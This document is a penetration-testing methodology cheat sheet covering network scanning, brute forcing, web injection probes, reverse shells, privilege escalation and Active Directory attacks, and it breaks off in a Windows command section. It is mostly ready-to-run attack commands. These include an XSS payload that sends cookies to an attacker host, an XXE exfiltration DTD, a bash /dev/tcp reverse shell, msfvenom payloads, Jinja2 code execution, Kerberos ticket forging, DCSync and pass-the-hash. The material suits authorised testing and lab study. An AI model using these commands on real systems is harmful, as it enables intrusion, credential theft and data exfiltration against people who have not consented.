# Elijahs Methodology 

> Commands, tools, and workflows for penetration testing engagements.

---

## Table of Contents
- [Network Penetration Testing](#network-penetration-testing)
- [Web Application Testing](#web-application-testing)
- [Reverse Shells and Listeners](#reverse-shells-and-listeners)
- [Linux Privilege Escalation](#linux-privilege-escalation)
- [Post-Exploitation and Lateral Movement](#post-exploitation-and-lateral-movement)
- [Active Directory](#active-directory)
- [Windows Privilege Escalation](#windows-privilege-escalation)
- [Windows CLI Navigation Cheat Sheet](#windows-cli-navigation-cheat-sheet)

---

## Network Penetration Testing

### Initial Nmap Scan
Run a comprehensive scan and pipe results into Searchsploit for quick vuln identification.

```bash
# Full version + aggressive scan, output to XML
nmap -sV -A -p- -oX nmapresults.xml <target>

# Feed results into Searchsploit
searchsploit --nmap nmapresults.xml
```

---

### Service Enumeration by Port

| Service | Port | Command |
|---------|------|---------|
| FTP | 21 | `nmap -p 21 --script ftp-anon,ftp-brute <target>` |
| SSH | 22 | `nmap -p 22 --script ssh-brute <target>` |
| HTTP/HTTPS | 80, 443 | `nmap -p 80,443 --script http-enum <target>` |
| SMB | 445 | `nmap -p 445 --script smb-enum-shares,smb-enum-users <target>` |
| RDP | 3389 | `nmap -p 3389 --script rdp-enum-encryption <target>` |

---

### Brute Forcing with Hydra

```bash
# FTP brute force
hydra -l <username> -P /usr/share/wordlists/rockyou.txt ftp://<target>

# SSH brute force
hydra -l <username> -P /usr/share/wordlists/rockyou.txt ssh://<target>

# HTTP POST login form
hydra -l <username> -P /usr/share/wordlists/rockyou.txt <target> http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect"

# Multiple usernames from a file
hydra -L /usr/share/wordlists/users.txt -P /usr/share/wordlists/rockyou.txt ssh://<target>
```

---

## Web Application Testing

### Initial Scan

```bash
# Full version + aggressive scan, output to XML
nmap -sV -A -p- -oX nmapresults.xml <target>

# Feed results into Searchsploit
searchsploit --nmap nmapresults.xml
```

---

### Directory and Subdomain Enumeration

```bash
# Directory brute force
ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 200 -u target/FUZZ -fs 0

# Virtual host / subdomain enumeration
gobuster vhost -u http://<target> -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt --append-domain

# DNS subdomain enumeration (alternative)
gobuster dns -d <target-domain> -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
```

---

### Tech Stack Fingerprinting

```bash
# Identify CMS, frameworks, server versions
whatweb http://<target>

# Curl headers for version info
curl -I http://<target>

# Wappalyzer (browser extension) -- identify client-side tech stack visually
```

---

### Manual Content Discovery Checklist

```
[ ] /robots.txt          -- may reveal hidden paths
[ ] /sitemap.xml         -- enumerates site structure
[ ] Response headers     -- check Server, X-Powered-By for versioning
[ ] /login.php / /admin  -- check for auth portals
[ ] Source code          -- comments may leak paths, credentials, API keys
[ ] Enumerate users      -- names, emails, usernames from content
```

---

### BurpSuite -- Request Manipulation

```
[ ] Capture all requests via proxy (set browser proxy to 127.0.0.1:8080)
[ ] Attempt parameter manipulation (change IDs, roles, values)
[ ] Check for JWT misuse -- decode at jwt.io, test alg:none attack
[ ] Inspect cookies -- test for predictable session tokens
[ ] Test for IDOR -- change object IDs in requests (e.g., ?id=1 to ?id=2)
[ ] Test for privilege escalation via role parameters
```

---

### Manual Injection Testing -- Quick Probes

The goal is to confirm something is injectable before throwing automated tools at it. One probe, one response, interpret before escalating.

---

#### SQL Injection -- Manual Probes

```bash
# Basic error-based probe (single quote)
# If the app throws a DB error, SQLi is likely
'
''
`
```

```bash
# Boolean-based -- compare true vs false responses
# True condition should return normal page; false should differ
?id=1 AND 1=1--
?id=1 AND 1=2--

# If the page changes between the two, it's likely injectable
```

```bash
# Time-based blind (no visible error or response difference)
# MySQL -- page should hang ~5 seconds if injectable
?id=1 AND SLEEP(5)--

# MSSQL equivalent
?id=1; WAITFOR DELAY '0:0:5'--

# PostgreSQL equivalent
?id=1; SELECT pg_sleep(5)--
```

```bash
# Authentication bypass classics (test in login fields)
' OR '1'='1
' OR 1=1--
admin'--
' OR 'x'='x
```

```bash
# Once confirmed injectable -- hand off to sqlmap
sqlmap -u "http://<target>/page?id=1" --batch --dbs
sqlmap -u "http://<target>/page?id=1" -D <dbname> --tables
sqlmap -u "http://<target>/page?id=1" -D <dbname> -T <tablename> --dump

# SQLi via POST body
sqlmap -u "http://<target>/login" --data="username=admin&password=test" --batch --dbs

# SQLi with a saved Burp request file
sqlmap -r request.txt --batch --dbs
```

---

#### XSS -- Manual Probes

```bash
# Reflect these into any input field, URL param, or header the app echoes back
# If the payload executes as JS rather than rendering as text, it's XSS

# Basic alert probe
<script>alert(1)</script>

# Attribute escape probe (for inputs rendered inside HTML attributes)
"><script>alert(1)</script>
" onmouseover="alert(1)

# Tag filter bypass attempts
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>

# Stored XSS -- submit payload into forms/comments/profile fields
# then trigger it by visiting the page that renders it

# Confirm blind XSS with an out-of-band callback
<script>fetch('http://<your-ip>:8080/?c='+document.cookie)</script>
```

```bash
# Set up listener to catch blind XSS callbacks
python3 -m http.server 8080
# or
nc -nvlp 8080
```

---

#### SSTI -- Manual Probes

The template engine will evaluate the expression rather than print it literally. Always start with math -- if {{7*7}} returns 49, you have SSTI.

```bash
# Universal math probe -- works across engines
{{7*7}}
${7*7}
<%= 7*7 %>
#{7*7}
*{7*7}

# If any of these returns 49 instead of the literal string, SSTI confirmed
```

```bash
# Engine fingerprinting -- inject after confirming evaluation
# Jinja2 / Twig distinction
{{7*'7'}}
# Jinja2 returns: 7777777
# Twig returns:   49

# Freemarker probe
${7*7}

# Tornado / Mako
<%- 7*7 %>
```

```bash
# Jinja2 RCE (most common in Python/Flask apps on THM)
# Verify RCE with id before running anything else
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}

# Enumerate subclasses -- index for Popen varies per app, do not assume
{{''.__class__.__mro__[1].__subclasses__()}}
```

```bash
# Once confirmed -- hand off to sstimap
sstimap -u "http://<target>/page?name=test"
sstimap -u "http://<target>/page?name=test" --os-shell
```

> NOTE: The Jinja2 MRO chain payload requires finding the correct index for subprocess.Popen. It varies per application. Do not copy an index from a writeup and assume it will match your target. Enumerate manually or let sstimap handle it.

---

#### XXE -- Manual Probe

```bash
# If the app accepts XML input (look for Content-Type: application/xml or text/xml),
# inject a basic entity and see if it resolves

# Basic XXE -- read /etc/passwd
<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>

# OOB XXE -- useful when response does not reflect content
# Host a malicious DTD on your machine
<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY % xxe SYSTEM "http://<your-ip>:8080/evil.dtd"> %xxe;]>
<root></root>

# evil.dtd content
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % exfil "<!ENTITY &#x25; send SYSTEM 'http://<your-ip>:8080/?data=%file;'>">
%exfil;
%send;
```

---

#### IDOR -- Manual Probe Checklist

```
[ ] Identify any parameter referencing an object by ID (?id=, ?user=, ?file=, ?order=)
[ ] Change your own ID to another user's -- does it return their data?
[ ] Test IDs sequentially (1, 2, 3...) and non-sequentially (0, -1, 9999)
[ ] Test GUIDs if used -- sometimes predictable or leaked in other responses
[ ] Check POST bodies -- IDORs hide in request bodies too, not just URL params
[ ] Test with a second account if possible -- confirm A cannot access B's objects
[ ] Check indirect references -- filenames, hashes, and encoded values can be IDORs too
```

---

#### Command Injection -- Manual Probes

```bash
# Inject into any field that might be passed to a system call
# (ping fields, filename inputs, conversion tools, anything run server-side)

# Chaining operators -- test each individually
;id
&&id
||id
`id`
$(id)

# Blind CI -- time-based confirmation
;sleep 5
&&sleep 5

# Blind CI -- OOB callback
;curl http://<your-ip>:8080/ci-test
;wget http://<your-ip>:8080/ci-test

# Once confirmed -- reverse shell
;bash -c 'bash -i >& /dev/tcp/<your-ip>/4444 0>&1'
```

**Windows / PowerShell command injection breakout pattern** (confirmed against a log-viewer style
`Get-Content('...')` sink during this engagement):

```powershell
# Test order: single char at a time, read the error TYPE not just the message.
# 1. Baseline special chars first:
"
'
;
)
#

# A runtime error (e.g. "path not found") means your char became literal string content.
# A PARSER error (e.g. "missing terminator", "missing closing ')' in expression")
# means you broke out of the string/expression -- that's your confirmation.

# 2. Once you know a leading quote closes the existing string, chain a command:
';whoami;#
# If this throws "Missing closing ')' in expression", your # ate the trailing
# ')' the template still needed -- close the call yourself before commenting out the rest:
');whoami;#

# 3. Base64-encode more complex payloads (reverse shells, anything with its own quotes)
# to avoid quote-collision with the outer injection context:
powershell -enc <base64 UTF-16LE blob>
```

---

#### Open Redirect -- Manual Probe

```bash
# Look for redirect parameters: ?next=, ?url=, ?redirect=, ?return=, ?redir=
# Inject an external URL -- if the app redirects you there, it's vulnerable

?next=https://evil.com
?redirect=//evil.com
?url=https://evil.com

# Useful for phishing chains and OAuth token theft
```

---

### OWASP Top 10 -- Tool Reference

| Vulnerability | Tool | Example Command |
|---------------|------|-----------------|
| SQL Injection | `sqlmap` | `sqlmap -u "http://<target>/page?id=1" --batch --dbs` |
| SSTI | `sstimap` | `sstimap -u "http://<target>/page?name=test"` |
| XSS | `xsstrike` | `python3 xsstrike.py -u "http://<target>/page?q=test"` |
| CSRF | `xsrfprobe` | `python3 -m xsrfprobe -u http://<target>` |
| General Vulns | `nuclei` | `nuclei -u http://<target> -t cves/` |
| XXE | `xxeinjector` | `ruby XXEinjector.rb --host=<localIP> --file=request.txt` |

```bash
# SQLMap -- dump a specific database
sqlmap -u "http://<target>/page?id=1" -D <dbname> --tables

# SQLMap -- dump table contents
sqlmap -u "http://<target>/page?id=1" -D <dbname> -T <tablename> --dump

# Nuclei -- scan with all templates
nuclei -u http://<target> -t nuclei-templates/
```

---

### Full Manual Testing Checklist

```
[ ] SQL Injection   -- inject ' and AND 1=2-- into every param; check for errors or response diffs
[ ] XSS             -- inject <script>alert(1)</script> into every reflected input
[ ] SSTI            -- inject {{7*7}} into every template-rendered input; look for 49 in response
[ ] XXE             -- check for XML input; inject entity and watch for file content in response
[ ] IDOR            -- increment/decrement every object ID; test with two accounts if possible
[ ] Cmd Injection   -- inject ;id and ;sleep 5 into any field that interacts with the OS
[ ] Open Redirect   -- inject external URLs into redirect params; check if app follows them
[ ] JWT             -- decode at jwt.io; test alg:none, weak secret, and key confusion attacks
[ ] CSRF            -- check for missing or predictable tokens on state-changing requests
[ ] Mass Assignment -- submit extra fields in JSON/POST bodies; test role, isAdmin, etc.
```

---

## Reverse Shells and Listeners

### Generate Payload with MSFvenom

```bash
# Linux ELF reverse shell
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<your-ip> LPORT=4444 -f elf > shell.elf

# Windows EXE reverse shell
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<your-ip> LPORT=4444 -f exe > shell.exe

# PHP reverse shell (web upload)
msfvenom -p php/meterpreter_reverse_tcp LHOST=<your-ip> LPORT=4444 -f raw > shell.php

# ASP reverse shell
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<your-ip> LPORT=4444 -f asp > shell.asp
```

---

### Set Up Listener

```bash
# Netcat listener
nc -nvlp 4444

# rlwrap for arrow-key/history support on a raw shell (attacker-side only,
# doesn't touch the target, fixes a lot of what "stabilizing" means on Windows)
rlwrap nc -nvlp 4444

# Metasploit multi/handler (for meterpreter payloads)
msfconsole
use exploit/multi/handler
set payload linux/x86/meterpreter/reverse_tcp
set LHOST <your-ip>
set LPORT 4444
run
```

---

### Shell Stabilisation

```bash
# Step 1 -- Drop into a PTY from meterpreter
shell

# Step 2 -- Spawn a stable bash shell with Python
python3 -c 'import pty; pty.spawn("/bin/bash")'
# or Python 2
python -c 'import pty; pty.spawn("/bin/bash")'

# Step 3 -- Background and fix terminal size
Ctrl+Z
stty raw -echo; fg

# Step 4 -- Fix terminal environment
export TERM=xterm
stty rows 38 cols 116

# Background a meterpreter session
background
```

> NOTE: The above stabilization steps are Linux-target techniques (fixing a `/bin/bash` PTY).
> They do not apply to a raw Windows PowerShell reverse shell -- see the
> [Windows CLI Navigation Cheat Sheet](#windows-cli-navigation-cheat-sheet) below for the
> Windows-side equivalent notes.

---

## Linux Privilege Escalation

### Initial Enumeration

```bash
# External Linux recon (unauthenticated)
enum4linux -a <target>

# Current user and privileges
whoami && id

# Check sudo rights
sudo -l

# Kernel version (look for kernel exploits)
uname -a

# OS version
cat /etc/os-release
```

---

### Find Useful Files

```bash
# Find flag files
find / -name "user.txt" 2>/dev/null
find / -name "root.txt" 2>/dev/null

# Find world-writable directories
find / -writable -type d 2>/dev/null
find / -perm -222 -type d 2>/dev/null

# Find SUID binaries (cross-ref with GTFOBins)
find / -perm -4000 -type f 2>/dev/null

# Find files owned by root but writable
find / -user root -writable -type f 2>/dev/null

# Find config files that may contain credentials
find / -name "*.conf" -o -name "*.config" -o -name "*.ini" 2>/dev/null | head -30
```

---

### linPEAS -- Automated Enumeration

```bash
# Step 1 -- Download linPEAS on your attack machine
wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh

# Step 2 -- Serve it via Python HTTP server
python3 -m http.server 8080

# Step 3 -- On target machine, download linPEAS
wget http://<your-ip>:8080/linpeas.sh
# or
curl -O http://<your-ip>:8080/linpeas.sh

# Step 4 -- Make executable and run
chmod +x linpeas.sh && ./linpeas.sh

# Step 5 -- Cross-reference SUID/sudo results with GTFOBins
# https://gtfobins.github.io/
```

---

### Common Priv Esc Vectors

```bash
# Sudo abuse -- check sudo -l, then GTFOBins
sudo vim -c ':!/bin/bash'

# Cron jobs -- look for writable scripts run as root
cat /etc/crontab
ls -la /etc/cron*

# SUID binary abuse (example: find)
find . -exec /bin/bash -p \; -quit

# PATH hijacking -- if a SUID script calls a binary without full path
echo '/bin/bash' > /tmp/<binaryname>
chmod +x /tmp/<binaryname>
export PATH=/tmp:$PATH
```

---

## Post-Exploitation and Lateral Movement

### SSH-Based Movement

```bash
# Find private SSH keys on target
find / -name "id_rsa" 2>/dev/null
find / -name "*.pem" 2>/dev/null

# Fix permissions and authenticate
chmod 600 id_rsa
ssh -i id_rsa <user>@<target-ip>
```

---

### Credential Reuse

```bash
# Search bash history for credentials
cat /home/*/.bash_history
cat ~/.bash_history

# Search config files for passwords
grep -ri "password" /etc/ 2>/dev/null
grep -ri "passwd" /var/www/ 2>/dev/null

# Check auth logs
cat /var/log/auth.log | grep -i "password"
```

---

### SSH Session Hijacking

```bash
# Find active SSH agent sockets
find /tmp -name "ssh-*" 2>/dev/null

# Hijack the agent socket
SSH_AUTH_SOCK=/tmp/ssh-<socket-id>/agent.<pid> ssh-add -l
SSH_AUTH_SOCK=/tmp/ssh-<socket-id>/agent.<pid> ssh <user>@<target>
```

---

### Internal Network Recon

```bash
# Show internal IPs and interfaces
ip a

# Show routing table / reachable subnets
ip route

# Map internal hostnames
cat /etc/hosts

# ARP table -- find live hosts
arp -a

# Quick ping sweep (if nmap unavailable)
for i in {1..254}; do ping -c1 -W1 192.168.1.$i &>/dev/null && echo "192.168.1.$i UP"; done
```

---

### Port Forwarding

```bash
# Local port forward -- forward remote port to local machine
# Access target's port 80 via localhost:8080
ssh -L 8080:127.0.0.1:80 <user>@<target-ip>

# Dynamic SOCKS proxy -- route all traffic through target
ssh -D 1080 <user>@<target-ip>
# Then use proxychains to run tools through the proxy
proxychains nmap -sT -Pn 10.10.10.0/24

# Remote port forward -- expose your local port to target
ssh -R 4444:127.0.0.1:4444 <user>@<target-ip>
```

---

## Active Directory

### Attack Flow
```
Initial Access -> Enumeration -> Identify Weakness -> Exploit -> Privilege Escalation -> Own Domain
```

### What to Look For
| Target | Goal |
|--------|------|
| Users | Who exists in the domain |
| Groups | Who is in privileged groups (Domain Admins, etc.) |
| Computers | What machines are joined to the domain |
| Shares | Readable SMB shares with sensitive data |
| Policies | Weak password policies (min length, complexity) |
| Trusts | Trust relationships with other domains |

---

### Initial Nmap Scan -- AD Ports
```bash
nmap -sV -A -p- -oX nmapresults.xml <target>
searchsploit --nmap nmapresults.xml
```

| Port | Service | Notes |
|------|---------|-------|
| 53 | DNS | AD-integrated DNS, often zone-transferable if misconfigured |
| 88 | Kerberos | Authentication in AD |
| 135 | RPC | Remote Procedure Call (endpoint mapper) |
| 139 | NetBIOS | Legacy SMB support |
| 389 | LDAP | Directory queries |
| 445 | SMB | File sharing + enumeration |
| 464 | kpasswd | Kerberos password change |
| 593 | RPC over HTTP | Alt RPC transport |
| 636 | LDAPS | LDAP over SSL |
| 3268 | Global Catalog | Domain-wide user search |
| 3269 | Global Catalog SSL | GC over SSL |
| 5985/5986 | WinRM | Remote management (HTTP/HTTPS) |
| 9389 | AD Web Services | .NET-based, used by PowerShell AD module |

> **Version note:** `-A` runs OS/version detection, script scanning, and traceroute together — on a full `-p-` scan this can take a long time. On a big AD range, consider running `-sV -sC` first for speed and saving `-A`'s OS-detection/traceroute overhead for a single target.

---

## Port 53 — DNS

### Recon/Enumeration
```bash
# Basic lookup of the domain
dig @<target> <domain>

# Attempt a zone transfer (often blocked, but worth checking)
dig axfr @<target> <domain>

# Enumerate common AD-related DNS records
dig @<target> _ldap._tcp.dc._msdcs.<domain> SRV
dig @<target> _kerberos._tcp.dc._msdcs.<domain> SRV
```
These SRV records reveal the actual Domain Controller hostname(s), which is useful before targeting Kerberos/LDAP directly.

---

## Port 88 — Kerberos

### Recon/Enumeration
```bash
# Confirm the port is live and identify the realm via a Kerberos error response
kerbrute -h  # verify installed version/flags before use — flag set varies by build

# User enumeration via Kerberos pre-auth (does not require valid creds)
kerbrute userenum -d <domain> --dc <target> userlist.txt
```
Kerberos user enumeration works because the KDC responds differently for valid vs. invalid usernames during pre-authentication — this is a distinct technique from AS-REP roasting below, and doesn't require pre-auth to be disabled.

### AS-REP Roasting (expanded)
Only works against accounts with **"Do not require Kerberos preauthentication"** set.
```bash
# Find accounts with pre-auth disabled and grab their hashes (no creds needed)
impacket-GetNPUsers <domain>/ -usersfile users.txt -dc-ip <target> -no-pass -format hashcat

# If you already have one valid credential, you can enumerate via LDAP instead of a wordlist
impacket-GetNPUsers <domain>/<username>:<password> -dc-ip <target> -request

# Crack the AS-REP hash
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt
```

### Kerberoasting (expanded)
Targets service accounts with an SPN set — their TGS is encrypted with the service account's password hash.
```bash
# Request service tickets for all SPNs, then crack offline
impacket-GetUserSPNs <domain>/<username>:<password> -dc-ip <target> -request

# Save output in hashcat format explicitly
impacket-GetUserSPNs <domain>/<username>:<password> -dc-ip <target> -request -outputfile spn_hashes.txt

# Crack the TGS ticket with hashcat (RC4 tickets)
hashcat -m 13100 ticket.txt /usr/share/wordlists/rockyou.txt

# AES-encrypted tickets use a different mode — check the hash prefix ($krb5tgs$18$ = AES256)
hashcat -m 19700 ticket.txt /usr/share/wordlists/rockyou.txt
```
> **Flag this:** hashcat mode numbers for Kerberos hashes have changed across versions as AES support was added — confirm with `hashcat --help | grep -i krb5` on the version you're running rather than assuming 13100/18200 are current.

### Ticket Attacks (post-compromise)
These require an existing foothold with sufficient rights (domain admin for golden ticket; access to a specific service account's hash for silver ticket) — not initial-access techniques.
```bash
# Golden Ticket — forge a TGT using the krbtgt hash (requires krbtgt NTLM hash, obtained via DCSync or similar)
impacket-ticketer -nthash <krbtgt_hash> -domain-sid <SID> -domain <domain> <username>

# Silver Ticket — forge a TGS for a specific service using that service account's hash
impacket-ticketer -nthash <service_account_hash> -domain-sid <SID> -domain <domain> -spn <service_spn> <username>

# Use a forged ticket (set KRB5CCNAME then use impacket tools with -k -no-pass)
export KRB5CCNAME=ticket.ccache
impacket-psexec -k -no-pass <domain>/<username>@<target>
```
I'm confident on the general workflow above; exact required privileges and any additional flags (e.g., `-user-id`, `-aesKey` vs `-nthash`) should be checked against `impacket-ticketer -h` for the impacket version installed, since these tools change between releases.

---

## Port 135 — RPC (Endpoint Mapper)

### Recon/Enumeration
```bash
# Check for null session access
rpcclient -U "" <target> -N

# Once connected -- enumerate domain users
rpcclient $> enumdomusers

# Enumerate domain groups
rpcclient $> enumdomgroups

# Get user info (RID from enumdomusers output)
rpcclient $> queryuser <RID>

# Enumerate group membership
rpcclient $> querygroupmem <group_RID>

# Password policy (useful before any brute-forcing)
rpcclient $> getdompwinfo

# List domain trust relationships
rpcclient $> enumdomains
```

### RID Cycling
```bash
# Common RID values
# 500  = Administrator
# 501  = Guest
# 512  = Domain Admins
# 513  = Domain Users
# 514  = Domain Guests

# RID cycling with CrackMapExec
crackmapexec smb <target> -u '' -p '' --rid-brute

# RID cycling with enum4linux
enum4linux -r -u "" -p "" <target>

# Manual RID cycling via rpcclient (loop, adjust range as needed)
for i in $(seq 500 1100); do
  rpcclient -U "" -N <target> -c "queryuser 0x$(printf '%x' $i)" 2>/dev/null | grep "User Name"
done
```

### Notable RPC-based exploits
```bash
# MS08-067 (legacy, rarely seen outside deliberately vulnerable labs)
# — verify target OS/patch level before attempting; this is a well-known CVE, not something to guess flags for
searchsploit ms08-067
```
For CVE-specific exploit modules (Metasploit or otherwise), confirm the module name and required options with `search`/`info`/`show options` inside msfconsole rather than reciting option names from memory — they change across versions.

---

## Port 139/445 — SMB

### SMB Enumeration
```bash
# All-in-one enumeration
enum4linux -a <target>

# CrackMapExec -- enumerate users
crackmapexec smb <target> --users

# CrackMapExec -- enumerate shares
crackmapexec smb <target> --shares

# CrackMapExec -- check password policy
crackmapexec smb <target> --pass-pol

# CrackMapExec -- validate a credential (also confirms local admin if it returns Pwn3d!)
crackmapexec smb <target> -u <username> -p <password>

# List SMB shares (null session)
smbclient -L //<target> -N

# Connect to a share (null session)
smbclient //<target>/<sharename> -N

# Map shares with permissions
smbmap -H <target>

# Map shares with credentials
smbmap -H <target> -u <username> -p <password>

# Recursively search shares for interesting files
smbmap -H <target> -u <username> -p <password> -R <sharename>
```

> **Note on `crackmapexec`:** it's been effectively superseded by **NetExec (nxc)** in many current distros/repos — same syntax pattern in most cases (`nxc smb <target> --users`), but confirm which one is actually installed with `which crackmapexec nxc` before assuming flag compatibility.

### Exploitation
```bash
# Pass-the-Hash (use an NTLM hash instead of a plaintext password)
crackmapexec smb <target> -u <username> -H <nthash>
impacket-psexec -hashes :<nthash> <domain>/<username>@<target>

# PsExec-style shell with valid creds
impacket-psexec <domain>/<username>:<password>@<target>

# WMI-based execution (quieter than psexec, no service binary dropped)
impacket-wmiexec <domain>/<username>:<password>@<target>

# EternalBlue (MS17-010) — deliberately-vulnerable lab boxes only
crackmapexec smb <target> -u '' -p '' -M ms17-010   # check-only, doesn't exploit
```
Don't assume EternalBlue will work without confirming the target is actually unpatched (`-M ms17-010` check first) — this is exactly the kind of "plausible-sounding" assumption the ground rules flag against.

---

## Port 389/636/3268/3269 — LDAP / LDAPS / Global Catalog

### LDAP Enumeration
```bash
# All-in-one LDAP enumeration
enum4linux-ng -A <target>

# LDAP anonymous query
ldapsearch -x -H ldap://<target> -b "DC=<domain>,DC=<tld>" "(objectClass=person)"

# Query for all users
ldapsearch -x -H ldap://<target> -b "DC=<domain>,DC=<tld>" "(objectClass=user)" sAMAccountName

# Query for all groups
ldapsearch -x -H ldap://<target> -b "DC=<domain>,DC=<tld>" "(objectClass=group)" cn

# Query for computers joined to the domain
ldapsearch -x -H ldap://<target> -b "DC=<domain>,DC=<tld>" "(objectClass=computer)" dNSHostName

# Query for accounts with pre-auth disabled (AS-REP roastable) directly via LDAP
ldapsearch -x -H ldap://<target> -b "DC=<domain>,DC=<tld>" "(userAccountControl:1.2.840.113556.1.4.803:=4194304)"

# Authenticated bind (once you have creds)
ldapsearch -x -H ldap://<target> -D "<domain>\<username>" -w <password> -b "DC=<domain>,DC=<tld>" "(objectClass=user)"
```

### Global Catalog (3268/3269)
Same LDAP query syntax works against 3268, but searches span the **entire forest** rather than a single domain — useful in multi-domain environments to find users/groups without knowing which domain they live in.
```bash
ldapsearch -x -H ldap://<target>:3268 -b "DC=<domain>,DC=<tld>" "(objectClass=user)" sAMAccountName
```

### BloodHound collection via LDAP (no agent on target)
```bash
# bloodhound-python — collects from LDAP + SMB remotely, no SharpHound.exe needed
bloodhound-python -u <username> -p <password> -d <domain> -ns <dc_ip> -c All
```

### LDAP Relay / NTLM Relay to LDAP
Requires a machine account or user to authenticate to you (e.g., via a coerced auth or responder capture) with LDAP signing not enforced.
```bash
# ntlmrelayx targeting LDAP — check current impacket flags, this changes often
impacket-ntlmrelayx -t ldap://<target> --escalate-user <controlled_user>
```
I'd verify `--escalate-user` and related relay-to-LDAP flags against `impacket-ntlmrelayx -h` for your installed version before running this — relay tooling option names shift release to release.

---

## Post-Compromise / Lateral Movement (cross-port)

### Pass-the-Hash / Overpass-the-Hash
```bash
# Pass-the-hash across most SMB/WMI/RPC tools
impacket-psexec -hashes :<nthash> <domain>/<username>@<target>

# Overpass-the-hash — use NTLM hash to request a real Kerberos TGT
impacket-getTGT <domain>/<username> -hashes :<nthash>
export KRB5CCNAME=<username>.ccache
```

### DCSync
Requires the target account to have replication rights (Domain Admins, or specifically delegated `Replicating Directory Changes` rights).
```bash
impacket-secretsdump <domain>/<username>:<password>@<target>
```
This dumps NTDS.dit contents remotely without touching disk on the DC — including the `krbtgt` hash needed for golden tickets above.

### Unconstrained/Constrained Delegation abuse, Zerologon, PrintNightmare, etc.
These are specific CVE/misconfiguration exploit paths, each with version-sensitive tooling and preconditions (e.g., Zerologon/CVE-2020-1472 only affects unpatched DCs). Rather than list exploit commands from memory here, treat each as its own lookup: confirm the CVE applies to the target's patch level first (`searchsploit`, vendor advisory, or `crackmapexec`/`nxc` check-modules where available), then pull exact tool syntax from `-h`/`--help` on the specific tool version in your lab environment.

---

## Password Policy / Spray Considerations
```bash
# Check policy before any spraying to avoid lockouts
crackmapexec smb <target> --pass-pol
rpcclient -U "" -N <target> -c "getdompwinfo"

# Password spray (single password, many users) — respects lockout threshold better than brute force
crackmapexec smb <target> -u users.txt -p '<single_password>'
```

---

## Windows Privilege Escalation

### Initial Enumeration

```bash
# Current user and privileges
whoami
whoami /priv
whoami /groups
whoami /all

# System info (look for unpatched vulnerabilities)
systeminfo

# List running processes
tasklist /SVC

# List installed services
sc query type= all

# Check scheduled tasks
schtasks /query /fo LIST /v

# List users and groups
net users
net localgroup administrators

# Domain-context account -- check domain group membership
# (local whoami output doesn't always expand nested domain groups)
net user <username> /domain
Get-ADUser -Identity <username> -Properties MemberOf | Select -ExpandProperty MemberOf
```

**Reading `whoami /priv` correctly:** a privilege only matters if its **State** column
says `Enabled`. A privilege that's entirely absent from the list (not even shown as
`Disabled`) means that token capability isn't available to the account at all --
e.g. no `SeImpersonatePrivilege` listed means Potato-family impersonation attacks
aren't a viable path regardless of what else you find.

---

### winPEAS -- Automated Enumeration

```powershell
# Download winPEAS on your attack machine and serve it
python3 -m http.server 8080

# On target -- download winPEAS (PowerShell)
Invoke-WebRequest -Uri http://<your-ip>:8080/winPEASx64.exe -OutFile C:\Temp\winpeas.exe

# Alternatively with certutil (noisier / commonly AV-flagged)
certutil -urlcache -f http://<your-ip>:8080/winPEASx64.exe C:\Temp\winpeas.exe

# Run winPEAS
C:\Temp\winpeas.exe

# For a PowerShell recon script instead of the compiled binary
# (useful when AV blocks known signatures, or you want auditable/readable output):
Invoke-WebRequest -Uri http://<your-ip>:8080/recon.sh -OutFile C:\Windows\Temp\recon.ps1
powershell -ExecutionPolicy Bypass -File C:\Windows\Temp\recon.ps1

# Cross-reference results with LOLBAS
# https://lolbas-project.github.io/
```

> NOTE: File extension matters for execution, not for hosting. The attacker-side filename
> served over HTTP can be anything -- what matters is the extension you give it in
> `-OutFile` on the Windows target. It must end in `.ps1` for `powershell -File` to run it;
> `.sh` will be rejected as an unrecognized script type on Windows.

---

### Common Windows Priv Esc Vectors

```powershell
# Unquoted service paths
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\"

# Weak service permissions (check with accesschk)
accesschk.exe -uwcqv "Authenticated Users" * /accepteula

# AlwaysInstallElevated -- check if enabled
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

# Check stored credentials
cmdkey /list
```

---

## Windows CLI Navigation Cheat Sheet

> Quick-reference for moving around and searching a Windows target from an interactive
> shell, whether you land in `cmd.exe` or `PowerShell`. Confirm which shell you're in
> first -- a PowerShell prompt reads `PS C:\path>`, cmd.exe reads `C:\path>` with no `PS`.
> `$PSVersionTable` returns output in PowerShell and errors in cmd.exe; that's a quick test.

### Identifying Your Shell

```powershell
# In PowerShell -- returns version info
$PSVersionTable

# Launch a nested PowerShell session from cmd.exe (if you landed in cmd but want
# PowerShell cmdlets available)
powershell
```

### Navigation

| Task | PowerShell | cmd.exe |
|------|-----------|---------|
| Show current directory | `pwd` / `Get-Location` | `cd` (no args) |
| Change directory | `cd <path>` | `cd <path>` |
| Go up one level | `cd ..` | `cd ..` |
| Go up two levels | `cd ../..` | `cd ..\..` |
| List directory contents | `Get-ChildItem` / `ls` / `dir` | `dir` |
| List hidden/system files | `Get-ChildItem -Force` | `dir /a` |
| List recursively | `Get-ChildItem -Recurse` | `dir /s` |
| Bare output (paths only) | `Get-ChildItem -Name` | `dir /b` |

### Reading File Contents

| Task | PowerShell | cmd.exe |
|------|-----------|---------|
| Print file contents | `Get-Content <path>` / `cat` / `gc` | `type <path>` |
| Search file contents for a string | `Select-String "pattern" <path>` | *(no direct equivalent; use `findstr`)* |
| Search contents, cmd-native | -- | `findstr /i "pattern" <path>` |

### Finding Files

```powershell
# PowerShell -- recursive filename search from a given root, suppressing
# access-denied noise so real hits aren't buried
